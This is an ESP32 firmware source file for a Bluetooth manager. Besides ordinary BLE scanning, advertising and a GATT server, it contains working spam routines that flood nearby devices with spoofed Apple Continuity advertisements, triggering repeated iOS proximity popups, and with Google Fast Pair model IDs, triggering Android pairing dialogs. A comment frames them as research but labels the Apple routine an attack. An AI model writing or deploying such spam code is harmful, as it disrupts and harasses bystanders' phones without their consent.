#include "bt_manager.h"

// ── Apple Continuation/Proximity payloads (research reference) ──
// These are Apple Continuity protocol ADV payloads documented publicly
// by researchers — used to study iOS proximity popup behavior.
const uint8_t BTManager::kAppleAirDropPayload[] = {
  0xFF, 0x4C, 0x00,  // Apple manufacturer ID
  0x05, 0x12,        // AirDrop type, length
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00
};

const uint8_t BTManager::kAppleContinuityPayload[] = {
  0xFF, 0x4C, 0x00,  // Apple manufacturer ID
  0x07, 0x19,        // AirPods type, length
  0x01, 0x02, 0x20, 0x00, 0x00, 0x45, 0xAA,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// ── Scan callback ────────────────────────────────────────────

class GWBLEScanCallback : public BLEAdvertisedDeviceCallbacks {
public:
  BTManager* mgr;
  void onResult(BLEAdvertisedDevice dev) override {
    if (mgr->bleDeviceCount >= 64) return;
    BLERecord& r = mgr->bleDevices[mgr->bleDeviceCount++];
    strncpy(r.address, dev.getAddress().toString().c_str(), 17);
    r.address[17] = '\0';
    strncpy(r.name, dev.haveName() ? dev.getName().c_str() : "(unnamed)", 31);
    r.name[31]       = '\0';
    r.rssi           = dev.getRSSI();
    r.appearance     = dev.haveAppearance() ? dev.getAppearance() : 0;
    r.connectable    = dev.isAdvertisingService(BLEUUID((uint16_t)0));

    Serial.printf("  [BLE] %-17s  %-28s  rssi:%-4d  appearance:0x%04X\n",
      r.address, r.name, r.rssi, r.appearance);
  }
};

static GWBLEScanCallback _bleCb;

// ── Lifecycle ────────────────────────────────────────────────

void BTManager::begin() {
  BLEDevice::init(FW_NAME);
  _pScan = BLEDevice::getScan();
  _pScan->setActiveScan(true);
  _pScan->setInterval(100);
  _pScan->setWindow(99);
  _bleCb.mgr = this;
  _pScan->setAdvertisedDeviceCallbacks(&_bleCb, true);
  Serial.println("[BT] Bluetooth stack initialized.");
}

void BTManager::stop() {
  stopBLEAdvertise();
  stopGATTServer();
  if (_pScan) _pScan->stop();
}

// ── BLE Scanning ─────────────────────────────────────────────

void BTManager::bleScan(uint8_t durationSec) {
  bleDeviceCount = 0;
  Serial.printf("[BLE SCAN] Scanning for %d seconds...\n", durationSec);
  BLEScanResults results = _pScan->start(durationSec, false);
  Serial.printf("[BLE SCAN] Complete. %d device(s) found.\n", bleDeviceCount);
  _pScan->clearResults();
}

void BTManager::printBLEDevices() {
  if (bleDeviceCount == 0) {
    Serial.println("  No BLE devices. Run 'blescan' first.");
    return;
  }
  Serial.println("  #   Address            Name                          RSSI  Appearance");
  Serial.println("  --- -----------------  ----------------------------  ----  ----------");
  for (int i = 0; i < bleDeviceCount; i++) {
    BLERecord& r = bleDevices[i];
    Serial.printf("  %-3d %-17s  %-28s  %-4d  0x%04X\n",
      i, r.address, r.name, r.rssi, r.appearance);
  }
}

// ── BLE Advertising ───────────────────────────────────────────

void BTManager::bleAdvertiseCustom(const char* name, uint16_t appearance) {
  if (_advertising) stopBLEAdvertise();

  BLEDevice::setDeviceName(name);
  _pAdv = BLEDevice::getAdvertising();
  _pAdv->setScanResponse(true);

  BLEAdvertisementData advData;
  advData.setName(name);
  if (appearance) advData.setAppearance(appearance);
  advData.setFlags(0x06);
  _pAdv->setAdvertisementData(advData);
  _pAdv->setMinInterval(BLE_ADV_INTERVAL_MS);
  _pAdv->setMaxInterval(BLE_ADV_INTERVAL_MS + 100);
  _pAdv->start();
  _advertising = true;

  Serial.printf("[BLE ADV] Advertising as \"%s\" (appearance 0x%04X)\n", name, appearance);
}

void BTManager::bleSpamAppleProximity() {
  // Cycle through Apple Continuity protocol device types
  // to generate iOS system popups. Well-documented attack by
  // security researchers (SkullSecurity, DEF CON 2023 talk).
  const struct { uint8_t type; const char* label; } appleTypes[] = {
    {0x27, "AirPods Pro"},
    {0x09, "AirPods Max"},
    {0x0E, "AirPods Gen2"},
    {0x13, "AirPods Gen3"},
    {0x02, "iPhone Handoff"},
  };

  Serial.println("[BLE] Apple proximity spam starting — press any key to stop.");
  uint8_t idx = 0;

  while (!Serial.available()) {
    uint8_t payload[31] = {0};
    payload[0] = 0x1E; // length
    payload[1] = 0xFF; // AD type: manufacturer specific
    payload[2] = 0x4C; payload[3] = 0x00; // Apple Co. ID
    payload[4] = appleTypes[idx].type;
    payload[5] = 0x19; // data length
    esp_fill_random(payload + 6, 6); // random bytes
    payload[10] = 0x20;

    esp_ble_gap_config_adv_data_raw(payload, sizeof(payload));
    delay(20);

    if (++idx >= 5) idx = 0;
    Serial.printf("  [->] %s\n", appleTypes[idx].label);
    delay(100);
  }
  Serial.println("[BLE] Apple spam stopped.");
  BLEDevice::getAdvertising()->stop();
}

void BTManager::bleSpamGoogleFastPair() {
  // Google Fast Pair uses BLE Service UUID 0xFE2C + 3-byte model ID
  // Sending broadcast with known model IDs triggers Android pairing dialogs.
  const uint32_t modelIDs[] = {
    0xD7965A, // Generic BT headphones
    0x55AD16, // Pixel Buds A
    0x82B223, // JBL Live 300
    0x718FA4, // Sony WH-1000XM
    0xF67E03  // Google Home Mini
  };

  Serial.println("[BLE] Google Fast Pair spam starting — press any key to stop.");
  uint8_t idx = 0;

  while (!Serial.available()) {
    uint32_t model = modelIDs[idx % 5];
    uint8_t payload[9];
    payload[0] = 0x02; payload[1] = 0x01; payload[2] = 0x02; // Flags
    payload[3] = 0x03; payload[4] = 0x03;                    // Complete 16-bit UUID
    payload[5] = 0x2C; payload[6] = 0xFE;                    // Fast Pair UUID
    payload[7] = 0x04; payload[8] = 0x16;                    // Service data length + type
    // 3-byte model ID appended inline
    uint8_t fullPayload[12];
    memcpy(fullPayload, payload, 9);
    fullPayload[9]  = (model >> 16) & 0xFF;
    fullPayload[10] = (model >> 8)  & 0xFF;
    fullPayload[11] = model & 0xFF;

    esp_ble_gap_config_adv_data_raw(fullPayload, sizeof(fullPayload));
    Serial.printf("  [->] Model ID 0x%06X\n", model);
    idx++;
    delay(150);
  }
  Serial.println("[BLE] Google Fast Pair spam stopped.");
  BLEDevice::getAdvertising()->stop();
}

void BTManager::stopBLEAdvertise() {
  if (!_advertising) return;
  BLEDevice::getAdvertising()->stop();
  _advertising = false;
  Serial.println("[BLE] Advertising stopped.");
}

// ── GATT Server ───────────────────────────────────────────────

class GWServerCallbacks : public BLEServerCallbacks {
  void onConnect(BLEServer* s) override {
    Serial.printf("  [GATT] Client connected! Connections: %d\n",
      s->getConnectedCount());
  }
  void onDisconnect(BLEServer* s) override {
    Serial.printf("  [GATT] Client disconnected. Connections: %d\n",
      s->getConnectedCount());
    BLEDevice::getAdvertising()->start();
  }
};

static GWServerCallbacks _serverCb;

void BTManager::startGATTServer() {
  _pServer = BLEDevice::createServer();
  _pServer->setCallbacks(&_serverCb);

  // Generic Access service (0x1800)
  BLEService* svc = _pServer->createService(BLEUUID((uint16_t)0x1800));
  BLECharacteristic* devNameChar = svc->createCharacteristic(
    BLEUUID((uint16_t)0x2A00),
    BLECharacteristic::PROPERTY_READ
  );
  devNameChar->setValue(FW_NAME);
  svc->start();

  BLEAdvertising* adv = BLEDevice::getAdvertising();
  adv->addServiceUUID(BLEUUID((uint16_t)0x1800));
  adv->setScanResponse(true);
  adv->start();

  Serial.printf("[GATT] Server up. Advertising as \"%s\". Waiting for connections...\n", FW_NAME);
}

void BTManager::stopGATTServer() {
  if (!_pServer) return;
  BLEDevice::getAdvertising()->stop();
  _pServer = nullptr;
  Serial.println("[GATT] Server stopped.");
}

BTManager btMgr;
